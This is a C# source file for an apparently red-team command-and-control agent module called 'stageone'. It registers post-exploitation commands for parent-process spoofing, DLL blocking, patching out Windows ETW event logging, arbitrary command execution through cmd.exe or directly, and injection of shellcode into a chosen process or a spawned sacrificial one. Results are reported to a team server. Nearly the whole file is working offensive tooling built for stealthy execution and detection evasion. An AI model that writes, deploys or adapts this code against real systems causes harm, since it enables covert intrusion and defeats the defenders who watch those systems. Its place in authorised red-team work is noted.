using System;
using System.Diagnostics;
using System.Collections.Generic;

using Agent.Models;
using Agent.Commands;
using Agent.Execution;
using Agent.Injection;
using Agent.Interfaces;
using Agent.Controllers;


namespace Agent
{
    public class AgentModule : IAgentModule
    {
        public AgentModuleInfo GetModuleInfo()
        {
            return new AgentModuleInfo
            {
                Name = "stageone",
                Developer = "Daniel Duggan, Adam Chester",
                Commands = new List<AgentModuleInfo.AgentCommand>
                {
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "ppid",
                        Description = "Assign an alternate parent process for post-ex processes.",
                        HelpText = "ppid [pid]",
                        Callback = HandlePPIDConfig
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "blockdlls",
                        Description = "Launch post-ex processes with a binary signature policy that blocks non-Microsoft DLLs from the process space.",
                        HelpText = "blockdlls [true/false]",
                        Callback = HandleBlockDllsConfig
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "disableetw",
                        Description = "Patch out the EtwEventWrite function in post-ex processes prior to injection.",
                        HelpText = "disableetw [true/false]",
                        Callback = HandleDisableEtwConfig
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "spawnto",
                        Description = "Set the binary used as a temporary process for post-ex commands.",
                        HelpText = "spawnto [path]",
                        Callback = HandleSpawnToConfig
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "shell",
                        Description = "Execute a command via cmd.exe.",
                        HelpText = "shell [command]",
                        Callback = HandleShellCommand
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "run",
                        Description = "Execute a command without cmd.exe",
                        HelpText = "run [command]",
                        Callback = HandleRunCommand
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "inject",
                        Description = "Inject the provided shellcode into the specified PID.  EXIT_THREAD shellcode is recommended.",
                        HelpText = "inject [pid] [shellcode]",
                        Callback = HandleInject
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "spawn",
                        Description = "Spawn a sacrificial process and inject the provided shellcode. EXIT_PROCESS shellcode is recommended.",
                        HelpText = "spawn [shellcode]",
                        Callback = HandleSpawn
                    }
                }
            };
        }

        public void Initialise(AgentController agent, ConfigurationController config)
        {
            var moduleInfo = GetModuleInfo();
            agent.RegisterAgentModule(moduleInfo);

            // Initialise values
            config.SetOption(ConfigurationSettings.PPID, Process.GetCurrentProcess().Id);
            config.SetOption(ConfigurationSettings.BlockDLLs, false);
            config.SetOption(ConfigurationSettings.DisableETW, false);
            config.SetOption(ConfigurationSettings.SpawnTo, @"C:\Windows\System32\notepad.exe");

            // Tell Team Server
            agent.SendModuleRegistered(moduleInfo);
        }

        private void HandlePPIDConfig(string data, AgentController agent, ConfigurationController config)
        {
            PPID.SetConfig(data, agent, config);
        }

        private void HandleBlockDllsConfig(string data, AgentController agent, ConfigurationController config)
        {
            BlockDlls.SetConfig(data, agent, config);
        }

        private void HandleDisableEtwConfig(string data, AgentController agent, ConfigurationController config)
        {
            Etw.SetConfig(data, agent, config);
        }

        private void HandleSpawnToConfig(string data, AgentController agent, ConfigurationController config)
        {
            SpawnTo.SetConfig(data, agent, config);
        }

        private void HandleShellCommand(string data, AgentController agent, ConfigurationController config)
        {
            LocalExecution.CreateProcessForShellRun(agent, config, data, true);
        }

        private void HandleRunCommand(string data, AgentController agent, ConfigurationController config)
        {
            LocalExecution.CreateProcessForShellRun(agent, config, data, false);
        }

        private void HandleInject(string data, AgentController agent, ConfigurationController config)
        {
            var split = data.Split(' ');
            var pid = Convert.ToInt32(split[0]);
            var shellcode = split[1];

            Bishop.Inject(shellcode, pid, true);
        }

        private void HandleSpawn(string data, AgentController agent, ConfigurationController config)
        {
            var pid = LocalExecution.CreateSpawnToProcess(agent, config);
            Bishop.Inject(data, pid, false);
        }
    }
}